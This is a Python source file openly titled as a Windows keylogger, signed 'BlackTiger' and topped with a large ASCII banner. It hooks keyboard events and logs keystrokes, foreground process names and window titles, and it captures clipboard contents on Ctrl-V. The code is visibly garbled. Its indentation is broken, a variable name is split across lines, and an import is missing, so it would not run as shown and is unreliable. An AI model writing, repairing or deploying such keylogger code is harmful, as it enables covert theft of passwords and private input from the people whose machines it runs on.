#!/usr/bin/env/python
# This Python file uses the following encoding: utf-8

#Author: Mark Priston
#Facebook: https://www.facebook.com/blacktiger.khan
#Youtube: https://www.youtube.com/channel/UCEkclbUf3LMNkVOJ9_ln-mA
#######################################################################

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

banner = """
                                                 \033[1;34m                                                                                                                                                                                                                                                                              ``````                              
                                                        `-/oydmNNNNNNNNmhs+:.                       
                                                     -+hNNMMMMMMMMMMMMMMMMMMNms/`                   
                                                  .+dNMMMMMMMMMMMMMMMMMMMMMMMMMMNy:`                
                                                .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd+`              
                                              `oNMMMMMMMMMMMMMMMMMMMMMMMMNmmmNMMMMMMMd:             
                                             -dMMMMMMMMMMMMMMMMMMMMMMMmo:.```.:smMMMNmNs`           
                                            /NMMMMMMMMMMMMMMMMMMMMMMMo`         .ymmmNMMh.          
                                           /NMMMMMMMMMMMMMMMMMMMMMMMy            `yMMMMMMd`         
                                          .NMMMMMMMMMMMMMMMMMMMMMMMM/             +MMMMMMMy         
                                          hMMMMMMMMMMMMMMMMMMMMMMMMMs             yMMMMMMMM:        
                                         .MMMMMMMMMMMMMMMMMMMMMMMMMMM+`         `oMMMMMMMMMh        
                                         +MMMMMMMMMMMMMMMMMMMMMMMMMMMMd+-`````-+dMMMMMMMMMMN        
                                         oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdddmNMMMMMMMMMMMMM.       
                                         oMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMM.       
                                         /MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN        
                                         `NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs        
                                          oMMMMMMMMMMMMMMMNNmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.        
                                          `dMMMMMMMMMMMMNmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+         
                                           :MMMMMMMMMMmmmNMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMs          
                                         .yMMMMMMMMMNmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo           
                                       .sMMMMMMMMmmdmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm:            
                                     .sMMMMMMm+:sNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`             
                                   `sMMMMMMm+   +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`               
                                 `sNMMMMMN+`  /mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/                  
                               `sNMMMMMN+`  /dMMMMMMMMMMMMNMMMMMMMMMMMMMMMMNho:`                    
                             `oNMMMMMNo`  :dMMMMMMMMMMMMMM`.:+osyyhhyyso/:`                         
                           `oNMMMMMNo`  :dMMMMMMMMMMMMMMMM`                                         
                         `oNMMMMMmo`  :hMMMMMMMMMMMMMMMMMm                                          
                       `oNMMMMMdo.  -hMMMMMMMMMMmsssssss+.                                          
                     `+mMMMMNdo.  -hNMMMMMMMMMMMh                                                   
                   `+mMMMMNdo.  -yNMMMMMMMMMMMMMh                                                   
                 `+mMMMMNdo.  -yNMMMMMMMMMMMMMMMh                                                   
               `+mMMMMMNy-  .sNMMMMMMMMMMMMMMMMN+                                                   
             `+dMMMMMNy-  .sNMMMMMMMMMMo///////-                                                    
           `/dMMMMNNh:  .sNMMMMMMMMMMMM.                                                            
         `/dMMMMMMh:` .omMMMMMMMMMMMMMM.                                                            
        .dMMMMMMh:` .omMMMMMMMMMMMMMMMM.                                                            
        /MNmMMMh` .omMMMMMMMMMMMMMMMMMd`                                                            
        :mmNMMMNyymMMMMMMMMMMs///////:`                                                             
        :MMMMMMMMMMMMMMMMMMMM/                                                                      
        /MMMMMMMMMMMMMMMMMMMM/                                                                      
        -NMMMMMMMMMMMMMMMMMMN-                                                                      
         ./++++++++++++++++/.                                                                       
                            \033[1;m     
                            
                 \033[34mKEYLOGGER\033[0mBlackTiger
print (banner)
time.sleep(0.4)

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

 def get_current_process():

  # get a handle to the foreground window
  hwnd = user32.GetForegroundWindow()

  # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
  # store the current process ID
     process_id = "%d" % pid.value
     
  # grab the executable
     executable = create_string_buffer("\x00" * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
     
     psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
  
  # now read its title
     window_title = create_string_buffer("\x00" * 512)
       length = user32.GetWindowTextA(hwnd, byref(window_title),512)
       
  # print out the header if we're in the right process
  print
  print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_.
title.value)
print

  # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    def KeyStroke(event):

global current_window

  # check to see if target changed windows
    if event.WindowName != current_window:
    current_window = event.WindowName
    get_current_process()

  # if they pressed a standard key
if event.Ascii > 32 and event.Ascii < 127:
print chr(event.Ascii),
else:
  # if [Ctrl-V], get the value on the clipboard
  if event.Key == "V":
  
  win32clipboard.OpenClipboard()  
pasted_value = win32clipboard.GetClipboardData()
win32clipboard.CloseClipboard()

print "[PASTE] - %s" % (pasted_value),

else:

print "[%s]" % event.Key,

   # pass execution to next hook registered
return True
   # create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

   # register the hook and execute forever
   kl.HookKeyboard()
   pythoncom.PumpMessages()
